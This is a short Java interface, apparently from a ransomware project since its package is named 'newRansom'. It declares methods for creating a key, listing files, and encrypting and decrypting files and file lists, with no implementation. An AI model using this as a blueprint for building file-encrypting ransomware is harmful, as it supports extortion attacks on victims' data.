package newRansom;

import java.util.Map;

public interface CipInterface {

	public void CreateKey();
	public boolean CreateReadFile(String filepath,String filename);
	public void CreateListFile(String filepath);
	public void FileEncrypt(String filepath , String filename);
	public void FileDecryte(String filepath ,String filename ) ;
	public Map<String, String> ReturnList();
	public void ReadListFile(String filepath);
	public void ListEncrypt(String filepath, String filename);
	public void ListDecryte(String filepath, String filename);
}
